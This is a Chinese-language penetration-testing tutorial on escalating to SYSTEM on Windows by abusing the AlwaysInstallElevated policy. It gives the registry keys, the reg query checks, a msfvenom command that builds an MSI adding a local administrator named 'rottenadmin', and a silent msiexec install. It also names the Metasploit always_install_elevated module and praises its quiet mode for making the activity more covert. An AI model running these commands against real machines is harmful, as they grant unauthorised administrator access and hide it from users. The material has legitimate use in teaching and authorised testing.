AlwaysInstallElevated是微软允许非授权用户以SYSTEM权限运行安装文件(MSI)的一种设置。然而，给予用于这种权利会存在一定的安全隐患，因为如果这样做下面两个注册表的值会被置为"1"：
```
[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
“AlwaysInstallElevated”=dword:00000001 

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
“AlwaysInstallElevated”=dword:00000001
```
想查询这两个键值最简单的方法就是使用内建的命令：
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
> Note：如果这条命令出错类似于："The system was unable to find the specified registry key or value"，这可能是组策略里AlwaysInstallElevated没有被定义，因此不存在相关联的注册表项。
现在我们假设AlwaysInstallElevated已经启用了，我们可以利用MSFVenom工具来生成一个在目标机器上增加管理员用户的MSI安装文件：

```
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
```
当我们在目标机器上加载了新生成的MSI文件后，我们可以使用Windows命令行工具Msiexec进行安装：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
```
msiexec相关参数解释如下：

1./quiet=安装过程中禁止向用户发送消息

2./qn=不使用GUI

3./i=安装程序

执行后，我们可以在目标机器上检测我们新创建的管理员用户：

```
net localgroup Administrators
```

> Note:使用MSFVenom创建MSI文件时使用了always_install_elevated模块，那么在安装过程中会失败。这是因为操作系统会阻止未注册的安装。
```
Metasploit Module:exploit/windows/local/always_install_elevated
```
这个模块只需要连接到之前运行过的会话即可：


这是一种叫QUIET的高级设置，多数情况下我们都会愿意启动的。启用QUIET选项就跟在Msiexec中使用/quiet选项一样不会给用户显示任何信息。这样确保不会弹出任何信息，使我们的活动更加隐蔽。

这个模块会创建一个随机文件名的MSI文件并在提权成功后删除所有已部署的文件。
